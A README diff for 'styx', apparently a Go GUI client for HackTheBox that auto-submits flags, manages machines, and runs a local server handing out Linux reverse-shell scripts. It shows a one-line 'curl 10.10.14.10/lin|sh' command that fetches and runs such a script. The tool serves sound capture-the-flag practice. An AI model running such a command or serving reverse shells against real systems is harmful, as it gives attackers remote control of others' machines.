@@ -1,6 +1,8 @@
 ![styx river](/styx.png)
 # styx v0.0.1
- Styx is an cross-platform GUI interface for HackTheBox made in GoLang. Styx's UI is made with the [giu](https://github.com/AllenDang/giu) library.
+ Styx is an cross-platform GUI interface for HackTheBox made in GoLang. Styx's UI is made with the [giu](https://github.com/AllenDang/giu) library.  
+  
+ Styx is made with the objective of reducing the friction of playing seasonal machines on HTB through it's web interface. Allowing the user to quickly perform more time-sensitive actions in a faster manner.
  ## Features
  #### **Automatic Flag Submission** 
  Styx will continuously check the machine clipboard for any user or root flags, and will submit them automatically through HackTheBox's APIs. 
@@ -8,7 +10,7 @@
  Styx contains a simple HTTP server that listens on port :61337 and returns pre-made reverse-shell scripts for Linux. Allowing you to quickly get a reverse shell with a simple  `curl 10.10.14.10/lin|sh` 
  #### **Machine Management** 
  Styx allows the user to start and stop machines on their own behalf. Flag submission is handled by the **auto flag submission** feature. 
- 
+
 ## Usage
 1. `go install github.com/c3l3si4n/styx@HEAD`
 1. Create an app token on your HTB profile (any duration you want)
